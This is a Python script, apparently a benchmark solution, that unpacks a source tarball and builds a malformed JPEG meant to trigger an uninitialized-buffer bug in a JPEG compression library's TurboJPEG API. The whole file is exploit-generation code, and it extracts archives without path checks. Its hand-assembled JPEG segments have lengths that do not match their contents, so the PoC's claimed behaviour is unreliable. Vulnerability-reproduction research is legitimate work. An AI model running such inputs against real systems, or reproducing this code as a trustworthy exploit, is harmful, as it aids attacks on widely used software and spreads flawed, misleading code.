import tarfile
import os
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall()
        
        # Find the project root (assuming first directory is the project)
        extracted_dir = None
        for item in os.listdir('.'):
            if os.path.isdir(item) and not item.startswith('.'):
                extracted_dir = item
                break
        
        if not extracted_dir:
            raise RuntimeError("Could not find extracted project directory")
        
        # Look for fuzz target or test harness
        fuzz_target = None
        for root, dirs, files in os.walk(extracted_dir):
            for file in files:
                if file.endswith('.c') or file.endswith('.cc') or file.endswith('.cpp'):
                    with open(os.path.join(root, file), 'r') as f:
                        content = f.read()
                        # Common OSS-Fuzz patterns
                        if 'LLVMFuzzerTestOneInput' in content or \
                           'FUZZ_TEST' in content or \
                           'fuzz' in file.lower():
                            fuzz_target = os.path.join(root, file)
                            break
            if fuzz_target:
                break
        
        if not fuzz_target:
            # If no fuzz target found, try to compile a simple test program
            return self._generate_generic_poc(extracted_dir)
        
        # Analyze the vulnerability context and generate PoC
        return self._generate_uninitialized_poc(extracted_dir, fuzz_target)
    
    def _generate_uninitialized_poc(self, src_dir: str, fuzz_target: str) -> bytes:
        """Generate PoC for uninitialized buffer vulnerability in compression/transformation."""
        # Based on the vulnerability description, we need to trigger a path where
        # destination buffers are not allocated with tj3Alloc() and ZERO_BUFFERS is not defined.
        # We'll create a JPEG that triggers complex transformations with unusual parameters.
        
        # Minimal valid JPEG header
        jpeg_header = bytes([
            0xFF, 0xD8, 0xFF, 0xE0,  # SOI + APP0 marker
            0x00, 0x10,              # APP0 length (16 bytes)
            0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,  # "JFIF" + version
            0x01, 0x00,              # Density units + X density
            0x00, 0x01,              # Y density
            0x00, 0x00,              # Thumbnail width/height
            0xFF, 0xDB,              # DQT marker
            0x00, 0x43,              # DQT length (67 bytes)
            0x00                    # QTable info (0 = luminance, 8-bit precision)
        ])
        
        # Add quantization table (all zeros to trigger edge cases)
        quantization_table = bytes([0] * 64)
        
        # Add SOF0 marker (Start of Frame, Baseline DCT)
        sof0 = bytes([
            0xFF, 0xC0,              # SOF0 marker
            0x00, 0x11,              # Length (17 bytes)
            0x08,                    # Precision (8 bits)
            0x00, 0x01,              # Height (1 pixel - minimal)
            0x00, 0x01,              # Width (1 pixel - minimal)
            0x03,                    # Number of components
            # Component 1 (Y)
            0x01,                    # Component ID
            0x22,                    # Sampling factors (4:2:2)
            0x00,                    # Quantization table selector
            # Component 2 (Cb)
            0x02,                    # Component ID
            0x11,                    # Sampling factors (1:1)
            0x01,                    # Quantization table selector
            # Component 3 (Cr)
            0x03,                    # Component ID
            0x11,                    # Sampling factors (1:1)
            0x01                     # Quantization table selector
        ])
        
        # Add DHT marker (Huffman tables) - minimal
        dht = bytes([
            0xFF, 0xC4,              # DHT marker
            0x00, 0x14,              # Length (20 bytes)
            0x00,                    # Table class + ID (DC luminance)
            # Huffman codes (minimal)
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00                      # Symbol values
        ])
        
        # Add SOS marker (Start of Scan)
        sos = bytes([
            0xFF, 0xDA,              # SOS marker
            0x00, 0x0C,              # Length (12 bytes)
            0x03,                    # Number of components
            # Component 1
            0x01,                    # Component ID
            0x00,                    # DC/AC table selector
            # Component 2
            0x02,                    # Component ID
            0x11,                    # DC/AC table selector
            # Component 3
            0x03,                    # Component ID
            0x11,                    # DC/AC table selector
            0x00,                    # Spectral selection start
            0x3F,                    # Spectral selection end
            0x00                     # Successive approximation
        ])
        
        # Add minimal scan data (encoded DC coefficient for 1x1 pixel)
        scan_data = bytes([
            0x00,                    # Encoded DC difference (0)
            0xFF, 0xD9               # EOI marker
        ])
        
        # Combine all parts
        poc = (jpeg_header + quantization_table + sof0 + dht + sos + scan_data)
        
        # Pad to target length (2708 bytes) with garbage data to fill buffers
        # This increases the chance of triggering uninitialized memory usage
        target_length = 2708
        if len(poc) < target_length:
            # Add padding with specific patterns that might trigger edge cases
            # Use non-zero values to avoid zero-initialization detection
            padding = bytes([(i % 256) for i in range(target_length - len(poc))])
            poc += padding
        
        return poc
    
    def _generate_generic_poc(self, src_dir: str) -> bytes:
        """Generate a generic PoC when no fuzz target is found."""
        # Create a minimal JPEG that should trigger common compression/transformation paths
        # This is a fallback strategy
        
        # Very minimal JPEG (just header and EOI)
        minimal_jpeg = bytes([
            0xFF, 0xD8,  # SOI
            0xFF, 0xD9   # EOI
        ])
        
        # Pad to target length
        target_length = 2708
        padding = bytes([0x41] * (target_length - len(minimal_jpeg)))
        return minimal_jpeg + padding